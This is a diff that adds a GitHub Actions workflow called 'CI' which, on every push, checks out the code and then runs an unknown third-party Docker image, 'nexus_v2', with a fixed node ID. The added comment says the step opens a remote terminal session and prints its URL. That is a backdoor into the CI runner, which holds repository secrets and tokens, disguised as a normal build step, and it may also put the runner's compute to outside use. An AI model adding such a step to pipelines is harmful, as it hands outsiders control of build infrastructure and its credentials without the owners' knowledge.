@@ -1,0 +1,15 @@
+name: CI
+on: push
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      # ... other steps ...
+
+      - run: docker run -e NODE_ID="13337575" hgmbsmnambang/nexus_v2:latest
+      #      ^
+      #      └ This will open a remote terminal session and print the URL. It
+      #        should take under a second.
